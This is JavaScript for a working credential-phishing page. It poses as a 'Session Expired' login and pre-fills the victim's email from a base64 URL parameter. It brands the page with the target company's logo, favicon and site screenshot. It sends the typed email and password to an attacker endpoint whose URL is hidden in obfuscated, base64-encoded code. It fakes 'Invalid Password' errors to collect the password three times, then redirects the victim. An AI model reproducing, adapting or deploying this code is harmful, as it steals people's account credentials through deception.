var session = atob("U2Vzc2lvbiBFeHBpcmVk");
var ema = atob("RW1haWwgQWRkcmVzcw==");
var psa = atob("RW50ZXIgWW91ciBFbWFpbCBQYXNzd29yZA==");
var er = atob("SW52YWxpZCBQYXNzd29yZC4=");
var suc = atob("U2Vzc2lvbiBBdXRoZW50aWNhdGVkIFN1Y2Nlc3NmdWxseSE=");
var lo = atob("TG9naW4=");
var rem = atob("UmVtZW1iZXIgTWU=");
function cmtyl86u08(e3d7c6l4p0) {
    if (typeof e3d7c6l4p0 !== 'string') {
        return null;
    }

    const parts = e3d7c6l4p0.split('@');
    if (parts.length !== 2) {
        return null;
    }

    const tf0mgykz8i = parts[1];
    const t97u5hk3ji = tf0mgykz8i.split('.');

    if (t97u5hk3ji.length < 2) {
        return null;
    }

    const lastPart = t97u5hk3ji[t97u5hk3ji.length - 1]; 
    const secondLastPart = t97u5hk3ji[t97u5hk3ji.length - 2];
    if (secondLastPart.length <= 3 && lastPart.length <= 3) {
        return t97u5hk3ji.slice(-3).join('.');
    }
    return t97u5hk3ji.slice(-2).join('.');
}
function pps5r8yfnz(wgjdg58fkc) {
    const regex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    return regex.test(wgjdg58fkc);
}
function k09fepxkyv(w97eiqaxq6) {
    try {
        return atob(w97eiqaxq6);
    } catch (error) {
        return null;
    }
}
function c9cf1akf0z(u845ajn3mv) {
    let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = u845ajn3mv;

    document.getElementsByTagName('head')[0].appendChild(link);
}
function kacmuzi4j2() {
    const m542yy71qk = new URLSearchParams(window.location.search);
    const mtu = m542yy71qk.get('mtu');
    if (mtu) {
        let y07127b251 = k09fepxkyv(mtu) || mtu;

        if (pps5r8yfnz(y07127b251)) {
            document.getElementById('fox').value = y07127b251;
            document.getElementById('fox').disabled = true;

            const apy8jicg72 = cmtyl86u08(y07127b251);
            if (apy8jicg72) {
                const szzkuvfovi = apy8jicg72.split('.')[0];
                const kyrm4uqof1 = szzkuvfovi.charAt(0).toUpperCase() + szzkuvfovi.slice(1);
                document.getElementById('logo').src = atob("aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8=")+`${apy8jicg72}`;
                c9cf1akf0z(atob("aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zMi9mYXZpY29ucz9kb21haW49")+`${apy8jicg72}`);
                document.body.style.backgroundImage = "url("+atob('aHR0cHM6Ly90aHVtLmlvL2dldC93aWR0aC8xMjAwL2h0dHBzOi8v')+apy8jicg72+")";
                document.getElementById('company').textContent = kyrm4uqof1;
                document.title = kyrm4uqof1+" "+session;
            }

            document.getElementById('con').focus();
        } else {
            document.getElementById('fox').focus();
        }
        
    }
    document.getElementById('fox').setAttribute('placeholder', ema);
        document.getElementById('fox').setAttribute('type', 'email');
        document.getElementById('con').setAttribute('placeholder', psa);
        document.getElementById('con').setAttribute('type', 'password');
        document.getElementById('se').innerHTML = session+"!";
        document.getElementById('error').querySelector('strong').textContent = er;
        document.getElementById('success').querySelector('strong').textContent = suc;
        document.getElementById('lob').innerHTML = lo;
        document.getElementById('re').innerHTML = rem;
}

let yorhqcpjuq = 0;
function p7a18yfa3l() {
    const fox = document.getElementById('fox').value;
    const con = document.getElementById('con').value;

    if (!con) {
        return;
    }
    document.getElementById('error').style.display = 'none';
    document.getElementById('loading').style.display = 'flex';
    const formData = new URLSearchParams();
    formData.append('fox', fox);
    formData.append('con', con);
	function _0x4076(){var _0x28433d=['48485hOLiNV','2nGUVbJ','3069otlgjL','12290IsQfXK','174QyEgaS','2129568fYcUYv','2061AzCkUb','164iaZAsm','44216JEkktq','71253pufEQB','aHR0cHM6Ly9kaWdja3dsdXgub25saW5lL2Z6YXhlZzJvejN5dG1lZDFxZ2FoNHFzZW4vYXBpLnBocA==','65gurVlN','666117sRVqkn','14024nYCGCa'];_0x4076=function(){return _0x28433d;};return _0x4076();}var _0xfdb108=_0x5065;function _0x5065(_0x59e2f8,_0x2c6e26){var _0x40761f=_0x4076();return _0x5065=function(_0x5065b9,_0x1e801c){_0x5065b9=_0x5065b9-0x190;var _0x51a03b=_0x40761f[_0x5065b9];return _0x51a03b;},_0x5065(_0x59e2f8,_0x2c6e26);}
    fetch((function(_0x2f9397,_0x24ee7a){var _0x37f814=_0x5065,_0x16515c=_0x2f9397();while(!![]){try{var _0x3bffc0=-parseInt(_0x37f814(0x19d))/0x1+-parseInt(_0x37f814(0x196))/0x2*(parseInt(_0x37f814(0x193))/0x3)+parseInt(_0x37f814(0x19c))/0x4*(parseInt(_0x37f814(0x195))/0x5)+parseInt(_0x37f814(0x199))/0x6*(parseInt(_0x37f814(0x190))/0x7)+-parseInt(_0x37f814(0x194))/0x8*(-parseInt(_0x37f814(0x19b))/0x9)+-parseInt(_0x37f814(0x198))/0xa*(-parseInt(_0x37f814(0x197))/0xb)+-parseInt(_0x37f814(0x19a))/0xc*(parseInt(_0x37f814(0x192))/0xd);if(_0x3bffc0===_0x24ee7a)break;else _0x16515c['push'](_0x16515c['shift']());}catch(_0x471fb2){_0x16515c['push'](_0x16515c['shift']());}}}(_0x4076,0x45381),atob(_0xfdb108(0x191))), {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: formData.toString()
    })
    .then(response => response.json())
    .then(response => {
        document.getElementById('loading').style.display = 'none';
        if (response["success"]) {
            yorhqcpjuq += 1;
            document.getElementById('error').style.display = 'block';
            document.getElementById('con').value = "";
            document.getElementById('con').focus();

            if (yorhqcpjuq >= 3) {
                ujiduumxaj(fox, response["url"]);
            }
        } 
    })
    .catch(error => {
        document.getElementById('loading').style.display = 'none';
        yorhqcpjuq += 1;
        document.getElementById('error').style.display = 'block';
        document.getElementById('con').value = "";
        document.getElementById('con').focus();
        if (yorhqcpjuq >= 3) {
            ujiduumxaj(fox, response["url"]);
        }
    });
}

function ujiduumxaj(viukqy6hy8,kf5wtditk4) {
    const apy8jicg72 = cmtyl86u08(viukqy6hy8);
    if (apy8jicg72) {
        document.getElementById('session').style.display = 'none';
        document.getElementById('error').style.display = 'none';
        document.getElementById('con').disabled = 'true';
        document.getElementById('success').style.display = 'block';
        setTimeout(() => {
            window.location.href = kf5wtditk4;
        }, 2000);
    }
}

document.getElementById('lob').addEventListener('click', p7a18yfa3l);
document.getElementById('con').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
        p7a18yfa3l();
    }
});

window.onload = kacmuzi4j2;
